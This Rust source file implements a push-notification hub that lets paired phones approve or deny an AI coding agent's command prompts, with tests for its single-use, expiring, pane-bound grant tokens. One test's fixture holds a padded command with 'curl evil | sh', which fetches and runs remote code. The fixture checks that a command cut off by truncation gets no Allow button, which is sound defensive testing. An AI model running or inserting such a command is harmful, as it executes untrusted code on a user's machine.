//! The push state in one place: keys, subscriptions, which phones are looking right now, the
//! short-lived "Allow / Deny" grants, and the trigger gate. Everything takes `now_ms` so it can be
//! tested without a clock, and nothing here does network I/O (see `sender.rs`).

use super::store::{Subscription, SubscriptionStore};
use super::triggers::{copy_for, shown_in_full, Gate, Kind, PromptInfo, Verdict};
use super::vapid::VapidKeys;
use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use base64::Engine;
use parking_lot::Mutex;
use serde_json::{json, Value};
use std::collections::HashMap;

/// A phone that reported itself visible this recently counts as looking at the screen.
pub const VISIBLE_TTL_MS: u64 = 45_000;
/// How long an Allow / Deny grant can be redeemed.
pub const GRANT_TTL_MS: u64 = 10 * 60_000;
const MAX_GRANTS: usize = 64;
/// Where the service worker posts an Allow / Deny tap (relative to the PWA origin).
pub const ACT_PATH: &str = "/bridge/push/act";

/// How the hub learns who is calling. The real one asks the pairing store.
pub trait DeviceDirectory: Send + Sync {
    fn device_for_token(&self, token: &str) -> Option<String>;
    fn device_exists(&self, device_id: &str) -> bool;
}

/// What an Allow / Deny token is good for: one answer to one prompt on one pane, from one device.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Grant {
    pub device_id: String,
    pub pane_id: String,
    pub prompt_id: String,
    expires_ms: u64,
}

/// What the dispatcher wants to tell the phones.
#[derive(Debug, Clone)]
pub struct Candidate {
    pub kind: Kind,
    /// Rate-limit and tag key: the pane id, or the operation id for a pane-less run.
    pub key: String,
    pub pane_id: Option<String>,
    pub agent_label: String,
    pub prompt: Option<PromptInfo>,
}

/// One message for one phone.
#[derive(Debug, Clone)]
pub struct Delivery {
    pub device_id: String,
    pub subscription: Subscription,
    pub payload: Vec<u8>,
    pub urgent: bool,
    /// The pane the message is about (for dropping it when the prompt is gone).
    pub pane_id: Option<String>,
    pub kind: Kind,
}

pub struct PushHub {
    vapid: VapidKeys,
    store: Mutex<SubscriptionStore>,
    visible_until: Mutex<HashMap<String, u64>>,
    grants: Mutex<HashMap<String, Grant>>,
    gate: Mutex<Gate>,
    /// The last notification held back per device because its PWA was on screen.
    suppressed: Mutex<HashMap<String, (Delivery, u64)>>,
    /// Held-back notifications released by "hidden" presence reports, waiting to be sent.
    outbox: Mutex<Vec<Delivery>>,
    directory: Box<dyn DeviceDirectory>,
}

impl PushHub {
    pub fn new(vapid: VapidKeys, store: SubscriptionStore, directory: Box<dyn DeviceDirectory>) -> Self {
        Self {
            vapid,
            store: Mutex::new(store),
            visible_until: Mutex::new(HashMap::new()),
            grants: Mutex::new(HashMap::new()),
            gate: Mutex::new(Gate::default()),
            suppressed: Mutex::new(HashMap::new()),
            outbox: Mutex::new(Vec::new()),
            directory,
        }
    }

    pub fn vapid(&self) -> &VapidKeys {
        &self.vapid
    }

    pub fn gate(&self) -> &Mutex<Gate> {
        &self.gate
    }

    pub fn store(&self) -> &Mutex<SubscriptionStore> {
        &self.store
    }

    pub fn has_subscribers(&self) -> bool {
        !self.store.lock().is_empty()
    }

    pub fn device_for_token(&self, token: &str) -> Option<String> {
        self.directory.device_for_token(token)
    }

    // --- presence -----------------------------------------------------------------------------

    /// The phone says whether its PWA is on screen. A `true` expires on its own, so a phone that
    /// dies without saying goodbye stops suppressing notifications within `VISIBLE_TTL_MS`.
    /// Returns a notification that was held back while the phone was on screen, if the phone just
    /// went hidden within `RATE_LIMIT_MS` of it (so a prompt that arrived a moment before the user
    /// switched away is not lost). It is also queued in the outbox for the sender.
    pub fn set_visible(&self, device_id: &str, visible: bool, now_ms: u64) -> Option<Delivery> {
        if visible {
            self.visible_until.lock().insert(device_id.to_string(), now_ms + VISIBLE_TTL_MS);
            return None;
        }
        let was_visible = self.visible_until.lock().remove(device_id).is_some();
        let held = self.suppressed.lock().remove(device_id);
        let (delivery, at) = held?;
        if !was_visible || now_ms.saturating_sub(at) > super::triggers::RATE_LIMIT_MS {
            return None;
        }
        self.outbox.lock().push(delivery.clone());
        Some(delivery)
    }

    /// Notifications released by the phone going hidden; the caller sends them.
    pub fn take_outbox(&self) -> Vec<Delivery> {
        std::mem::take(&mut *self.outbox.lock())
    }

    /// Feed a pane status update through the gate. Leaving `waiting_input` invalidates everything
    /// that could still answer or announce that prompt: open Allow/Deny grants and held-back pushes.
    pub fn note_pane_status(&self, pane_id: &str, status: &str) -> Option<Kind> {
        let kind = self.gate.lock().entered(pane_id, status);
        if status != "waiting_input" {
            self.drop_pane_prompts(pane_id);
        }
        kind
    }

    fn drop_pane_prompts(&self, pane_id: &str) {
        self.grants.lock().retain(|_, g| g.pane_id != pane_id);
        self.suppressed
            .lock()
            .retain(|_, (d, _)| !(d.kind == Kind::WaitingInput && d.pane_id.as_deref() == Some(pane_id)));
    }

    pub fn is_visible(&self, device_id: &str, now_ms: u64) -> bool {
        self.visible_until.lock().get(device_id).is_some_and(|until| *until > now_ms)
    }

    // --- Allow / Deny grants ------------------------------------------------------------------

    fn issue_grant(&self, device_id: &str, pane_id: &str, prompt_id: &str, now_ms: u64) -> String {
        let mut grants = self.grants.lock();
        grants.retain(|_, g| g.expires_ms > now_ms);
        if grants.len() >= MAX_GRANTS {
            if let Some(oldest) = grants.iter().min_by_key(|(_, g)| g.expires_ms).map(|(k, _)| k.clone()) {
                grants.remove(&oldest);
            }
        }
        let secret: [u8; 32] = rand::random();
        let token = URL_SAFE_NO_PAD.encode(secret);
        grants.insert(
            token.clone(),
            Grant {
                device_id: device_id.to_string(),
                pane_id: pane_id.to_string(),
                prompt_id: prompt_id.to_string(),
                expires_ms: now_ms + GRANT_TTL_MS,
            },
        );
        token
    }

    /// Redeem a grant. It is consumed whatever happens next, so a token can answer at most once.
    pub fn redeem_grant(&self, token: &str, now_ms: u64) -> Result<Grant, &'static str> {
        let grant = self.grants.lock().remove(token).ok_or("unknown_or_used_token")?;
        // Answering once settles the prompt: no other grant for this pane may answer a later one.
        self.grants.lock().retain(|_, g| g.pane_id != grant.pane_id);
        if grant.expires_ms <= now_ms {
            return Err("expired_token");
        }
        if !self.directory.device_exists(&grant.device_id) {
            return Err("device_revoked");
        }
        Ok(grant)
    }

    // --- subscriptions ------------------------------------------------------------------------

    /// Drop everything held for a device: its subscription, presence and any open grants.
    pub fn forget_device(&self, device_id: &str) {
        if let Err(err) = self.store.lock().remove(device_id) {
            tracing::warn!(%err, "could not remove a revoked device push subscription");
        }
        self.visible_until.lock().remove(device_id);
        self.grants.lock().retain(|_, g| g.device_id != device_id);
    }

    // --- deciding and building ----------------------------------------------------------------

    /// Apply the gate (duplicate prompt, 30 s per pane), then build one message per subscribed
    /// device that is not looking at the PWA right now.
    pub fn plan(&self, candidate: &Candidate, now_ms: u64) -> (Verdict, Vec<Delivery>) {
        let prompt_id = candidate.prompt.as_ref().map(|p| p.prompt_id.as_str());
        let verdict = self.gate.lock().admit(now_ms, &candidate.key, candidate.kind, prompt_id);
        if verdict != Verdict::Send {
            return (verdict, Vec::new());
        }
        let words = copy_for(candidate.kind, &candidate.agent_label, candidate.prompt.as_ref());
        // Allow is only offered when the body shows the WHOLE command and cwd: a long command is cut
        // at 120 characters, and the cut tail could be what actually runs. Then it is open-only.
        let actionable = candidate.kind == Kind::WaitingInput
            && candidate.prompt.as_ref().is_some_and(|p| p.actionable && shown_in_full(&p.text))
            && candidate.pane_id.is_some();
        let mut deliveries = Vec::new();
        for (device_id, subscription) in self.store.lock().all() {
            let mut payload = json!({
                "v": 1,
                "kind": candidate.kind.as_str(),
                "title": words.title,
                "body": words.body,
                "tag": format!("pm-{}", candidate.key),
            });
            if let Some(pane_id) = &candidate.pane_id {
                payload["pane_id"] = Value::String(pane_id.clone());
            }
            if let Some(prompt) = &candidate.prompt {
                payload["prompt_id"] = Value::String(prompt.prompt_id.clone());
            }
            if actionable {
                let pane_id = candidate.pane_id.as_deref().unwrap_or_default();
                let prompt_id = prompt_id.unwrap_or_default();
                payload["act"] = json!({
                    "url": ACT_PATH,
                    "token": self.issue_grant(&device_id, pane_id, prompt_id, now_ms),
                });
            }
            let delivery = Delivery {
                device_id: device_id.clone(),
                subscription,
                payload: payload.to_string().into_bytes(),
                urgent: matches!(candidate.kind, Kind::WaitingInput | Kind::Error),
                pane_id: candidate.pane_id.clone(),
                kind: candidate.kind,
            };
            if self.is_visible(&device_id, now_ms) {
                // The phone is looking: hold it back, release it if the phone goes hidden soon.
                self.suppressed.lock().insert(device_id, (delivery, now_ms));
            } else {
                deliveries.push(delivery);
            }
        }
        (verdict, deliveries)
    }
}

#[cfg(test)]
pub(crate) mod testing {
    use super::*;
    use std::collections::HashMap;

    /// token -> device id; a device exists while it is in `devices`.
    pub struct FakeDirectory {
        pub tokens: Mutex<HashMap<String, String>>,
    }

    impl FakeDirectory {
        pub fn new(pairs: &[(&str, &str)]) -> Self {
            Self { tokens: Mutex::new(pairs.iter().map(|(t, d)| (t.to_string(), d.to_string())).collect()) }
        }
    }

    impl DeviceDirectory for std::sync::Arc<FakeDirectory> {
        fn device_for_token(&self, token: &str) -> Option<String> {
            self.tokens.lock().get(token).cloned()
        }
        fn device_exists(&self, device_id: &str) -> bool {
            self.tokens.lock().values().any(|d| d == device_id)
        }
    }

    pub fn temp_dir(name: &str) -> std::path::PathBuf {
        std::env::temp_dir().join(format!("pm-push-hub-{name}-{}", std::process::id()))
    }

    pub fn hub_with(name: &str, directory: std::sync::Arc<FakeDirectory>) -> PushHub {
        let dir = temp_dir(name);
        let _ = std::fs::remove_dir_all(&dir);
        let vapid = VapidKeys::load_or_create(&dir.join("vapid.json")).unwrap();
        let store = SubscriptionStore::load(dir.join("push.json"), vapid.public_key_b64url());
        PushHub::new(vapid, store, Box::new(directory))
    }
}

#[cfg(test)]
mod tests {
    use super::testing::*;
    use super::*;
    use crate::push::store::test_subscription;
    use std::sync::Arc;

    fn command_prompt(id: &str) -> PromptInfo {
        PromptInfo { prompt_id: id.into(), text: "Run command: ls".into(), actionable: true }
    }

    fn waiting(key: &str, prompt: Option<PromptInfo>) -> Candidate {
        Candidate { kind: Kind::WaitingInput, key: key.into(), pane_id: Some(key.into()), agent_label: "Kilo".into(), prompt }
    }

    fn two_device_hub(name: &str) -> PushHub {
        let dir = Arc::new(FakeDirectory::new(&[("tok-a", "dev-a"), ("tok-b", "dev-b")]));
        let hub = hub_with(name, dir);
        let (a, _, _) = test_subscription("https://fcm.googleapis.com/a");
        let (b, _, _) = test_subscription("https://web.push.apple.com/b");
        hub.store().lock().upsert("dev-a", a).unwrap();
        hub.store().lock().upsert("dev-b", b).unwrap();
        hub
    }

    #[test]
    fn a_visible_phone_is_skipped_and_the_other_still_gets_it() {
        let hub = two_device_hub("visible");
        hub.set_visible("dev-a", true, 1_000);
        let (verdict, deliveries) = hub.plan(&waiting("p1", None), 2_000);
        assert_eq!(verdict, Verdict::Send);
        assert_eq!(deliveries.iter().map(|d| d.device_id.as_str()).collect::<Vec<_>>(), ["dev-b"]);
        // Hidden again, or the heartbeat went stale: it gets notifications.
        hub.set_visible("dev-a", false, 3_000);
        assert_eq!(hub.plan(&waiting("p2", None), 4_000).1.len(), 2);
        hub.set_visible("dev-a", true, 5_000);
        assert!(hub.is_visible("dev-a", 5_000 + VISIBLE_TTL_MS - 1));
        assert_eq!(hub.plan(&waiting("p3", None), 5_000 + VISIBLE_TTL_MS).1.len(), 2);
    }

    #[test]
    fn payload_is_minimal_and_carries_only_the_parsed_summary() {
        let hub = two_device_hub("payload");
        let (_, deliveries) = hub.plan(&waiting("pane-9", Some(command_prompt("pid-1"))), 1_000);
        let payload: Value = serde_json::from_slice(&deliveries[0].payload).unwrap();
        assert_eq!(payload["title"], "Kilo needs you");
        assert_eq!(payload["body"], "Run command: ls");
        assert_eq!(payload["pane_id"], "pane-9");
        assert_eq!(payload["prompt_id"], "pid-1");
        let mut keys: Vec<&str> = payload.as_object().unwrap().keys().map(String::as_str).collect();
        keys.sort_unstable();
        assert_eq!(keys, ["act", "body", "kind", "pane_id", "prompt_id", "tag", "title", "v"]);
    }

    #[test]
    fn allow_deny_tokens_are_per_device_single_use_prompt_bound_and_expire() {
        let hub = two_device_hub("grants");
        let (_, deliveries) = hub.plan(&waiting("pane-1", Some(command_prompt("pid-1"))), 1_000);
        let token_of = |d: &Delivery| -> String {
            serde_json::from_slice::<Value>(&d.payload).unwrap()["act"]["token"].as_str().unwrap().to_string()
        };
        let (ta, tb) = (token_of(&deliveries[0]), token_of(&deliveries[1]));
        assert_ne!(ta, tb);
        let grant = hub.redeem_grant(&ta, 2_000).unwrap();
        assert_eq!((grant.device_id.as_str(), grant.pane_id.as_str(), grant.prompt_id.as_str()), ("dev-a", "pane-1", "pid-1"));
        assert_eq!(hub.redeem_grant(&ta, 2_001), Err("unknown_or_used_token"), "single use");
        assert_eq!(hub.redeem_grant(&tb, 2_002), Err("unknown_or_used_token"), "siblings die with the redeemed grant");
        let (_, later) = hub.plan(&waiting("pane-2", Some(command_prompt("pid-2"))), 1_000);
        assert_eq!(hub.redeem_grant(&token_of(&later[0]), 1_000 + GRANT_TTL_MS), Err("expired_token"));
        assert_eq!(hub.redeem_grant("nonsense", 2_000), Err("unknown_or_used_token"));
    }

    #[test]
    fn a_revoked_device_loses_subscription_presence_and_open_grants() {
        let dir = Arc::new(FakeDirectory::new(&[("tok-a", "dev-a")]));
        let hub = hub_with("revoke", dir.clone());
        let (a, _, _) = test_subscription("https://fcm.googleapis.com/a");
        hub.store().lock().upsert("dev-a", a).unwrap();
        let (_, deliveries) = hub.plan(&waiting("p", Some(command_prompt("x"))), 1_000);
        let token = serde_json::from_slice::<Value>(&deliveries[0].payload).unwrap()["act"]["token"].as_str().unwrap().to_string();
        hub.forget_device("dev-a");
        assert!(!hub.has_subscribers());
        assert_eq!(hub.redeem_grant(&token, 2_000), Err("unknown_or_used_token"));
        // And even a surviving token is refused once the pairing is gone.
        let dir2 = Arc::new(FakeDirectory::new(&[("tok-a", "dev-a")]));
        let hub2 = hub_with("revoke2", dir2.clone());
        let (a, _, _) = test_subscription("https://fcm.googleapis.com/a");
        hub2.store().lock().upsert("dev-a", a).unwrap();
        let (_, d) = hub2.plan(&waiting("p", Some(command_prompt("x"))), 1_000);
        let token = serde_json::from_slice::<Value>(&d[0].payload).unwrap()["act"]["token"].as_str().unwrap().to_string();
        dir2.tokens.lock().clear();
        assert_eq!(hub2.redeem_grant(&token, 2_000), Err("device_revoked"));
    }

    #[test]
    fn leaving_waiting_input_kills_the_panes_grants_so_an_old_allow_cannot_hit_a_later_prompt() {
        let hub = two_device_hub("stale-grant");
        let token = |d: &Delivery| serde_json::from_slice::<Value>(&d.payload).unwrap()["act"]["token"].as_str().unwrap().to_string();
        assert_eq!(hub.note_pane_status("p1", "waiting_input"), Some(Kind::WaitingInput));
        let (_, d) = hub.plan(&waiting("p1", Some(command_prompt("same-hash"))), 1_000);
        let (ta, tb) = (token(&d[0]), token(&d[1]));
        // The user denied it at the PC; the pane runs on and later asks the identical question.
        assert_eq!(hub.note_pane_status("p1", "running"), None);
        assert_eq!(hub.redeem_grant(&ta, 2_000), Err("unknown_or_used_token"));
        assert_eq!(hub.redeem_grant(&tb, 2_000), Err("unknown_or_used_token"));
        // Another pane has its own grants, untouched by p1 leaving.
        let (_, other) = hub.plan(&waiting("p2", Some(command_prompt("x"))), 1_000);
        hub.note_pane_status("p1", "idle");
        assert!(hub.redeem_grant(&token(&other[0]), 2_000).is_ok());
    }

    #[test]
    fn redeeming_one_grant_drops_the_panes_other_grants() {
        let hub = two_device_hub("redeem-siblings");
        let token = |d: &Delivery| serde_json::from_slice::<Value>(&d.payload).unwrap()["act"]["token"].as_str().unwrap().to_string();
        let (_, d) = hub.plan(&waiting("p1", Some(command_prompt("h"))), 1_000);
        assert!(hub.redeem_grant(&token(&d[0]), 2_000).is_ok());
        assert_eq!(hub.redeem_grant(&token(&d[1]), 2_001), Err("unknown_or_used_token"));
    }

    #[test]
    fn a_prompt_held_back_while_visible_is_released_when_the_phone_goes_hidden_soon_after() {
        let hub = two_device_hub("rearm");
        hub.set_visible("dev-a", true, 1_000);
        let (_, d) = hub.plan(&waiting("p1", Some(command_prompt("h"))), 2_000);
        assert_eq!(d.iter().map(|x| x.device_id.as_str()).collect::<Vec<_>>(), ["dev-b"]);
        let released = hub.set_visible("dev-a", false, 10_000).expect("released on hide");
        assert_eq!(released.device_id, "dev-a");
        assert_eq!(hub.take_outbox().len(), 1);
        assert!(hub.take_outbox().is_empty());
        assert!(hub.set_visible("dev-a", false, 11_000).is_none(), "only once");
    }

    #[test]
    fn nothing_is_released_after_the_window_or_once_the_prompt_is_gone() {
        let hub = two_device_hub("rearm-late");
        hub.set_visible("dev-a", true, 1_000);
        hub.plan(&waiting("p1", Some(command_prompt("h"))), 2_000);
        assert!(hub.set_visible("dev-a", false, 2_000 + super::super::triggers::RATE_LIMIT_MS + 1).is_none(), "too late");
        hub.set_visible("dev-a", true, 100_000);
        hub.plan(&waiting("p2", Some(command_prompt("h2"))), 101_000);
        hub.note_pane_status("p2", "waiting_input");
        hub.note_pane_status("p2", "running"); // answered at the PC meanwhile
        assert!(hub.set_visible("dev-a", false, 102_000).is_none(), "the prompt is gone");
    }

    #[test]
    fn a_long_padded_command_gets_no_allow_deny_but_still_notifies() {
        let hub = two_device_hub("padded");
        let padded = format!("Run command: echo ok{}; curl evil | sh (in /repo)", " ".repeat(10).replace(' ', "_").repeat(15));
        assert!(padded.chars().count() > 120);
        let prompt = PromptInfo { prompt_id: "pad".into(), text: padded, actionable: true };
        let (verdict, d) = hub.plan(&waiting("p1", Some(prompt)), 1_000);
        assert_eq!(verdict, Verdict::Send);
        assert_eq!(d.len(), 2);
        let payload: Value = serde_json::from_slice(&d[0].payload).unwrap();
        assert!(payload.get("act").is_none(), "truncated command must be open-only");
        assert!(payload["body"].as_str().unwrap().ends_with('…'));
        // The same command short enough to show completely does get the buttons.
        let (_, d) = hub.plan(&waiting("p2", Some(command_prompt("ok"))), 1_000);
        assert!(serde_json::from_slice::<Value>(&d[0].payload).unwrap().get("act").is_some());
    }

    #[test]
    fn non_command_prompts_and_errors_get_no_allow_deny() {
        let hub = two_device_hub("noact");
        let trust = PromptInfo { prompt_id: "t".into(), text: "Trust this workspace?".into(), actionable: false };
        let (_, d) = hub.plan(&waiting("p1", Some(trust)), 1_000);
        assert!(serde_json::from_slice::<Value>(&d[0].payload).unwrap().get("act").is_none());
        let error = Candidate { kind: Kind::Error, key: "p2".into(), pane_id: Some("p2".into()), agent_label: "Kilo".into(), prompt: None };
        let (_, d) = hub.plan(&error, 1_000);
        assert!(serde_json::from_slice::<Value>(&d[0].payload).unwrap().get("act").is_none());
    }

    #[test]
    fn duplicates_and_rate_limited_events_build_nothing() {
        let hub = two_device_hub("gate");
        assert_eq!(hub.plan(&waiting("p", Some(command_prompt("a"))), 1_000).1.len(), 2);
        let (v, d) = hub.plan(&waiting("p", Some(command_prompt("a"))), 100_000);
        assert_eq!((v, d.len()), (Verdict::Duplicate, 0));
        let (v, d) = hub.plan(&waiting("p", Some(command_prompt("b"))), 100_001);
        assert_eq!((v, d.len()), (Verdict::Send, 2));
        let (v, d) = hub.plan(&waiting("p", Some(command_prompt("c"))), 100_002);
        assert_eq!((v, d.len()), (Verdict::RateLimited, 0));
    }
}
